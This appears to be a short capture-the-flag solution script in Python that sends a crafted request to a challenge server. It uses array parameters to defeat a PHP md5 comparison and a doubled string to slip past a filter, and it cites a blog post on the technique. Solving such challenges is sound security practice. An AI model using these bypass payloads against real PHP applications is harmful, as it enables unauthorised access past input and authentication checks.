import requests
from bs4 import BeautifulSoup

# http://13.229.76.35:9010/?req=Pls%20gimmePls%20gimme%20flag%20flag&a[]=1&b[]=11

# reference: https://qftm.github.io/2020/08/23/php-md5-bypass-audit/
#            http://20.205.238.7:10812/?anime_is_bae=hellotherehellotherehoomanhooman
url = 'http://13.229.76.35:9010/?'
param1 = 'req=Pls%20gimmePls%20gimme%20flag%20flag'
param2 = '&a[]=1'
param3 = '&b[]=11'

response = requests.post(url + param1 + param2 + param3)
print(response.text)